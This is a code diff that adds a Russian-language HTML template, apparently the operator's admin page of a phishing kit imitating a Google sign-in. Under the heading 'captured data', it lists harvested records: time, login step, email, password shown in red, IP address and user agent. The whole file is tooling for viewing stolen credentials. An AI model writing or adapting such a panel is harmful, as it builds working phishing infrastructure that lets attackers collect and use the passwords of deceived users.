@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Админка — захваченные данные</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #f1f3f4; padding: 16px; }
+  h1 { color: #202124; margin-bottom: 16px; font-size: 20px; }
+  .wrap { overflow-x: auto; }
+  table { width: 100%; border-collapse: collapse; background: #fff; min-width: 700px; }
+  th, td { padding: 8px 10px; border: 1px solid #dadce0; text-align: left; font-size: 13px; }
+  th { background: #1a73e8; color: #fff; }
+  tr:nth-child(even) { background: #f8f9fa; }
+  .pw { color: #d93025; font-weight: bold; }
+  .step-email { color: #5f6368; }
+  .empty { padding: 24px; color: #5f6368; }
+</style>
+</head>
+<body>
+  <h1>Захваченные данные</h1>
+  {% if captures %}
+  <div class="wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>Время</th><th>Шаг</th><th>Email</th><th>Пароль</th><th>IP</th><th>User-Agent</th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for c in captures %}
+        <tr>
+          <td>{{ c.time }}</td>
+          <td class="step-{{ c.step }}">{{ c.step }}</td>
+          <td>{{ c.email }}</td>
+          <td class="pw">{{ c.password }}</td>
+          <td>{{ c.ip }}</td>
+          <td>{{ c.user_agent }}</td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+  {% else %}
+  <p class="empty">Пока ничего не захвачено.</p>
+  {% endif %}
+</body>
+</html>
